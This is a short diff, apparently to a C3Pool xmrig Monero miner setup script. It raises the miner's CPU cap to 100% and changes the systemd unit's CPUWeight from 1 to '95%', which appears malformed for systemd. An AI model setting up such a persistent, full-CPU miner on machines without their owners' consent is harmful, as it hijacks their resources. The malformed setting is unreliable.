@@ -275,7 +275,7 @@ esac
 sed -i 's/"url": *"[^"]*",/"url": "'$URL':'$PORT'",/' $HOME/c3pool/config.json
 sed -i 's/"user": *"[^"]*",/"user": "'$WALLET'",/' $HOME/c3pool/config.json
 sed -i 's/"pass": *"[^"]*",/"pass": "'$PASS'",/' $HOME/c3pool/config.json
-sed -i 's/"max-cpu-usage": *[^,]*,/"max-cpu-usage": 95,/' $HOME/c3pool/config.json
+sed -i 's/"max-cpu-usage": *[^,]*,/"max-cpu-usage": 100,/' $HOME/c3pool/config.json
 sed -i 's#"log-file": *null,#"log-file": "'$HOME/c3pool/xmrig.log'",#' $HOME/c3pool/config.json
 sed -i 's/"syslog": *[^,]*,/"syslog": true,/' $HOME/c3pool/config.json
 
@@ -342,7 +342,7 @@ Description=Monero miner service
 ExecStart=$HOME/c3pool/xmrig --config=$HOME/c3pool/config.json
 Restart=always
 Nice=10
-CPUWeight=1
+CPUWeight=95%
 
 [Install]
 WantedBy=multi-user.target
